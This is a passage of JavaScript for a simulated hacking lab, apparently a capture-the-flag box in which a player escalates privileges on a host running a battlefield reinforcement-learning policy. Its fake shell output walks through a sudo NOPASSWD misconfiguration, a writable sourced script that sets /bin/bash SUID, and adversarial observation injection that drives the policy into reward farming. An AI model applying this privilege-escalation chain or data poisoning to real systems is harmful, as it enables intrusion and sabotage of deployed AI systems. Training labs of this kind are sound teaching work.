                    return 'cat: /opt/strategic_deception_protocol.txt: Permission denied\n[!] This file requires root access. Run oracle_privesc.py first.';
                }
                if (engine) engine.advancePhase && engine.advancePhase('deception');
                return D18Config._rlData.deceptionProtocol;
            }

            if (path.includes('oracle_env.sh') || path.includes('/opt/oracle/oracle_env')) {
                if (D18Config._context === 'attacker') {
                    return 'cat: /opt/oracle/oracle_env.sh: No such file or directory\n[!] You need SSH access to ORACLE-STRAT-01.';
                }
                return '#!/bin/bash\n# Oracle environment setup — sourced by reload_policy.sh\nexport ORACLE_MODEL_PATH=/opt/oracle/oracle_policy.pth\nexport ORACLE_OBS_STREAM=/opt/oracle/obs_stream_live.csv\nexport ORACLE_LOG_PATH=/opt/oracle/actions_log_live.csv\nexport PYTHONPATH=/opt/oracle/lib:$PYTHONPATH';
            }

            if (path.includes('oracle_policy.py') || path.includes('/opt/oracle/oracle_policy')) {
                if (D18Config._context === 'attacker') {
                    return 'cat: /opt/oracle/oracle_policy.py: No such file or directory';
                }
                return D18Config._oracleNodeFs['/'].children.opt.children.oracle.children['oracle_policy.py'].content;
            }

            if (path.includes('/etc/sudoers.d/oracle') || path.includes('sudoers')) {
                if (D18Config._context === 'attacker') {
                    return 'cat: /etc/sudoers.d/oracle: Permission denied';
                }
                return D18Config._oracleNodeFs['/'].children.etc.children['sudoers.d'].children.oracle.content;
            }

            if (path.includes('/opt/oracle/actions_log_live') || path.includes('actions_log_live')) {
                if (D18Config._context === 'attacker') {
                    return 'cat: /opt/oracle/actions_log_live.csv: No such file or directory';
                }
                return D18Config._oracleNodeFs['/'].children.opt.children.oracle.children['actions_log_live.csv'].content;
            }

            if (path.includes('README_OPERATOR') || path.includes('/home/oracle/README')) {
                if (D18Config._context === 'attacker') {
                    return 'cat: README_OPERATOR: No such file or directory';
                }
                return D18Config._oracleNodeFs['/'].children.home.children.oracle.children.README_OPERATOR.content;
            }

            return null;  // Fall through to built-in filesystem handler
        },

        'ls': function(args, term) {
            var path = (args.find(function(a) { return !a.startsWith('-'); }) || '').trim();

            if (D18Config._context === 'oracle-env' || D18Config._context === 'oracle-root') {
                if (!path || path === '.' || path === '/opt/oracle') {
                    return `total 52
drwxr-xr-x 2 oracle oracle 4096 Mar 19 18:44 .
drwxr-xr-x 4 root   root   4096 Jan 14 09:00 ..
-rw-rw-r-- 1 oracle oracle  428 Mar 19 18:44 oracle_env.sh
-rw-r--r-- 1 oracle oracle 8192 Mar 18 11:30 oracle_policy.pth
-rw-r--r-- 1 oracle oracle 2104 Mar 19 18:44 oracle_policy.py
-rw-r--r-- 1 oracle oracle  204 Mar 19 18:44 reload_policy.sh
-rw-r--r-- 1 oracle oracle 98304 Mar 19 18:45 obs_stream_live.csv
-rw-r--r-- 1 oracle oracle 16384 Mar 19 18:45 actions_log_live.csv`;
                }
                if (path === '/opt') {
                    return `total 16
drwxr-xr-x 4 root   root   4096 Jan 14 09:00 .
drwxr-xr-x 18 root  root   4096 Jan 14 08:00 ..
drwxr-xr-x 2 oracle oracle 4096 Mar 19 18:44 oracle
-r-------- 1 root   root   2048 Jan 14 09:30 strategic_deception_protocol.txt`;
                }
                if (path === '/opt' && D18Config._context === 'oracle-root') {
                    return `total 20
drwxr-xr-x 4 root   root   4096 Jan 14 09:00 .
drwxr-xr-x 18 root  root   4096 Jan 14 08:00 ..
drwxr-xr-x 2 oracle oracle 4096 Mar 19 18:44 oracle
-r-------- 1 root   root   2048 Jan 14 09:30 strategic_deception_protocol.txt`;
                }
            }

            return null;  // Fall through to built-in filesystem handler
        },

        'sudo': function(args, term, engine) {
            var fullCmd = args.join(' ');

            if (fullCmd.includes('reload_policy.sh') || fullCmd.includes('/opt/oracle/reload_policy')) {
                if (D18Config._context !== 'oracle-env') {
                    return 'sudo: only oracle user on ORACLE-STRAT-01 can run this command';
                }
                D18Config._privilegeEscalated = true;
                D18Config._switchContext('oracle-root', term);
                if (engine) engine.advancePhase && engine.advancePhase('deception');
                return `[sudo] password for oracle: (no password required — NOPASSWD rule)
[*] Sourcing /opt/oracle/oracle_env.sh
[*] Executing payload from oracle_env.sh...
chmod u+s /bin/bash
[+] Policy reload complete.
[+] /bin/bash is now SUID. Run: bash -p

root@ORACLE-STRAT-01:/#
[+] Context switched to oracle-root.`;
            }

            return `sudo: ${args[0] || 'command'}: command not found`;
        },

        'exit': function(args, term) {
            if (D18Config._context === 'oracle-root') {
                D18Config._switchContext('oracle-env', term);
                return '[+] Dropped from root to oracle user.\noracle@ORACLE-STRAT-01:/opt/oracle$';
            }
            if (D18Config._context === 'oracle-env') {
                D18Config._switchContext('attacker', term);
                return '[+] SSH session closed.\nConnection to 10.11.0.50 closed.\n\nkali@kali:~$';
            }
            return null;
        },

        'route': function(args) {
            if (D18Config._context === 'oracle-env' || D18Config._context === 'oracle-root') {
                return `Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.11.0.1       0.0.0.0         UG    100    0        0 eth0
10.11.0.0       0.0.0.0         255.255.255.0   U     100    0        0 eth0`;
            }
            return `Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.2.1        0.0.0.0         UG    100    0        0 eth0
10.0.2.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0`;
        },

        'netstat': function(args) {
            if (D18Config._context === 'oracle-env' || D18Config._context === 'oracle-root') {
                return `Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address      Foreign Address  State
tcp        0      0 0.0.0.0:22         0.0.0.0:*        LISTEN
tcp        0      0 0.0.0.0:9001       0.0.0.0:*        LISTEN
tcp        0      0 0.0.0.0:9002       0.0.0.0:*        LISTEN`;
            }
            return `Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address      Foreign Address  State
tcp        0      0 0.0.0.0:22         0.0.0.0:*        LISTEN`;
        },

        'ss': function(args) {
            return D18Config.commands.netstat(args);
        },

        'find': function(args) {
            var fullCmd = args.join(' ');
            if (D18Config._context === 'attacker') {
                return `./notes.txt
./oracle_rl_spec.json
./sim_battlefield_obs_stream.csv
./oracle_actions_log.csv
./parse_spec.py
./inject_obs.py
./read_action_log.py
./oracle_privesc.py
./.bash_history`;
            }
            if (D18Config._context === 'oracle-env') {
                return `/opt/oracle/oracle_env.sh
/opt/oracle/oracle_policy.pth
/opt/oracle/oracle_policy.py
/opt/oracle/reload_policy.sh
/opt/oracle/obs_stream_live.csv
/opt/oracle/actions_log_live.csv
/home/oracle/README_OPERATOR
/home/oracle/.bash_history`;
            }
            if (D18Config._context === 'oracle-root') {
                return `/opt/oracle/oracle_env.sh
/opt/oracle/oracle_policy.pth
/opt/oracle/oracle_policy.py
/opt/oracle/reload_policy.sh
/opt/oracle/obs_stream_live.csv
/opt/oracle/actions_log_live.csv
/opt/strategic_deception_protocol.txt
/home/oracle/README_OPERATOR
/home/oracle/.bash_history
/etc/sudoers.d/oracle`;
            }
            return '';
        },

        'head': function(args) {
            var file = args.find(function(a) { return !a.startsWith('-'); }) || '';
            if (file.includes('obs_stream') || file.includes('sim_battlefield')) {
                return D18Config._rlData.obsStream.slice(0, 5).map(function(r) {
                    return Object.values(r).join(',');
                }).join('\n');
            }
            if (file.includes('actions_log') || file.includes('oracle_actions')) {
                return D18Config._rlData.actionsLog.slice(0, 5).map(function(r) {
                    return Object.values(r).join(',');
                }).join('\n');
            }
            return null;
        },

        'tail': function(args) {
            var file = args.find(function(a) { return !a.startsWith('-'); }) || '';
            if (file.includes('actions_log_live') && D18Config._misbehaviorTriggered) {
                return `timestep=201,action=MOVE_TO_GAMMA,reward=0.40,note=[ADVERSARIAL] False Gamma threat triggered movement
timestep=202,action=MOVE_TO_GAMMA,reward=0.40,note=[ADVERSARIAL] Repeated Gamma movement -- reward farming
timestep=203,action=MOVE_TO_GAMMA,reward=0.40,note=[ADVERSARIAL] Critical resources stripped from Alpha/Beta/Delta
timestep=204,action=MOVE_TO_GAMMA,reward=0.40,note=[ADVERSARIAL] MISALLOC: Sector Gamma over-resourced
timestep=205,action=MOVE_TO_GAMMA,reward=0.40,note=[ADVERSARIAL] Policy collapse confirmed`;
            }
            return null;
        }
    },

    // ═══════════════════════════════════════════════════════
    // SQL HANDLER — not used in this box (no database target)
    // Kept as stub for BoxEngine compatibility.
    // ═══════════════════════════════════════════════════════

    _handleSQL(query, engine) {
        return 'psql: no database connection. This box does not use a relational database target.';
    },

    // ═══════════════════════════════════════════════════════
    // HTML ESCAPE UTILITY
    // ═══════════════════════════════════════════════════════

    _escHtml(str) {
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }

};
